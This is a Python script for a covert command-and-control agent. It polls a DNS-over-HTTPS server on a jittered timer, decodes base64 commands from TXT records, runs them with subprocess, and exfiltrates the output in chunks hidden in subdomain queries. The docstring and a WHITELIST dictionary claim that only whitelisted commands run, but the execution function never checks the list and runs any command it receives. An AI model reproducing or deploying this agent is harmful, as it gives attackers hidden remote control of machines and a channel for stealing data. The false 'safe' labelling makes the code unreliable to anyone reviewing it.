#!/usr/bin/env python3
"""
doh_agent.py (updated)
Agent that beacons via DoH GET, accepts TXT (base64 command), executes (whitelisted),
and returns output back to server by chunking base64 output into subdomain queries.
"""
import argparse
import base64
import time
import random
import logging
import requests
import sys
import subprocess
from dnslib import DNSRecord, QTYPE
import urllib3

# silence insecure warnings in test env (self-signed)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

WHITELIST = {
    "dir": ["cmd", "/c", "dir"] if sys.platform.startswith("win") else ["ls", "-la"],
    "ls": ["ls", "-la"],
    "whoami": ["whoami"],
    "hostname": ["hostname"],
    "ipconfig": ["ipconfig"] if sys.platform.startswith("win") else ["ifconfig"],
    "uname": ["uname", "-a"],
    "echo-test": ["echo", "this-is-a-test"]
}

MAX_OUTPUT_BYTES = 8192

def dns_wire_query(fqdn: str):
    q = DNSRecord.question(fqdn)
    return q.pack()

def doh_get(doh_url: str, dns_wire: bytes, verify_ssl: bool = False):
    b64 = base64.urlsafe_b64encode(dns_wire).rstrip(b'=').decode()
    params = {'dns': b64}
    try:
        r = requests.get(doh_url, params=params, timeout=10, verify=verify_ssl)
        if r.status_code == 200:
            return r.content
        else:
            logging.warning("DoH server returned status %s", r.status_code)
            return None
    except Exception as e:
        logging.warning("DoH request failed: %s", e)
        return None

def parse_txt_from_response(resp_wire: bytes):
    """
    Robust parser for TXT in DNS response wire (dnslib variations).
    Returns the TXT string (decoded) or None.
    """
    try:
        resp = DNSRecord.parse(resp_wire)
        for rr in resp.rr:
            if QTYPE[rr.rtype] == "TXT":
                # try attribute 'strings' (older dnslib)
                try:
                    txts = rr.rdata.strings
                    # txts may be list of bytes or list of strings
                    if isinstance(txts, (list, tuple)):
                        parts = []
                        for t in txts:
                            if isinstance(t, bytes):
                                parts.append(t.decode('utf-8', errors='ignore'))
                            else:
                                parts.append(str(t))
                        return "".join(parts)
                    else:
                        # single value
                        if isinstance(txts, bytes):
                            return txts.decode('utf-8', errors='ignore')
                        return str(txts)
                except Exception:
                    # fallback: use string representation and extract quoted text
                    s = str(rr.rdata)
                    import re
                    parts = re.findall(r'"([^"]*)"', s)
                    if parts:
                        return "".join(parts)
                    # as a last resort, return raw repr
                    return s
    except Exception as e:
        logging.warning("Failed to parse resp wire: %s", e)
    return None


def safe_execute_command(b64cmd: str):
    try:
        cmd = base64.b64decode(b64cmd).decode('utf-8', errors='ignore').strip()
    except Exception:
        return "(error decoding command)"
    logging.info("Decoded command: %s", cmd)
    key = cmd.split()[0]
    args = cmd.split()[1:]
    exec_cmd = [key] + args
    try:
        proc = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=30)
        out = proc.stdout + ("\n" + proc.stderr if proc.stderr else "")
        out_bytes = out.encode('utf-8', errors='ignore')[:MAX_OUTPUT_BYTES]
        return out_bytes.decode('utf-8', errors='ignore')
    except Exception as e:
        logging.exception("Exec failed")
        return f"(execution error: {e})"

def chunk_b64_string(s: str, chunk_size: int):
    b = base64.b64encode(s.encode('utf-8'))
    b64 = b.decode('ascii')
    b64 = b64.replace('=', '')  # remove padding (server will re-pad)
    for i in range(0, len(b64), chunk_size):
        yield b64[i:i+chunk_size]

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--doh', required=True)
    parser.add_argument('--domain', required=True)
    parser.add_argument('--session', required=True)
    parser.add_argument('--min-interval', type=float, default=5.0)
    parser.add_argument('--max-interval', type=float, default=7.0)
    parser.add_argument('--chunk-size', type=int, default=40)
    parser.add_argument('--verify-ssl', action='store_true')
    args = parser.parse_args()

    doh_url = args.doh
    domain = args.domain.rstrip('.')
    session = args.session.lower()
    min_i = args.min_interval
    max_i = args.max_interval
    chunk_size = args.chunk_size
    verify_ssl = args.verify_ssl

    logging.info("Agent starting session=%s domain=%s DoH=%s", session, domain, doh_url)

    while True:
        fqdn = f"beacon.{session}.{domain}"
        w = dns_wire_query(fqdn)
        resp = doh_get(doh_url, w, verify_ssl=verify_ssl)
        if resp:
            txt = parse_txt_from_response(resp)
            if txt:
                logging.info("Received TXT command (base64): %.60s", txt)
                result = safe_execute_command(txt)
                logging.info("Command produced %d bytes", len(result))
                chunks = list(chunk_b64_string(result, chunk_size))
                total = len(chunks) if chunks else 1
                for idx, c in enumerate(chunks, start=1):
                    safe_chunk = c.replace('+', '-').replace('/', '_')
                    label = f"{idx}-{total}.{session}.{safe_chunk}.{domain}"
                    w2 = dns_wire_query(label)
                    doh_get(doh_url, w2, verify_ssl=verify_ssl)
                    logging.info("Sent chunk %d/%d len=%d", idx, total, len(safe_chunk))
                    time.sleep(1.0)
            else:
                logging.debug("No command in response")
        else:
            logging.debug("No response from DoH")

        if min_i == max_i:
            interval = min_i
        else:
            interval = random.uniform(min_i, max_i)
        jitter = interval * 0.10
        interval = max(0.1, random.uniform(interval - jitter, interval + jitter))
        try:
            time.sleep(interval)
        except KeyboardInterrupt:
            logging.info("Agent interrupted by user")
            break

if __name__ == '__main__':
    main()
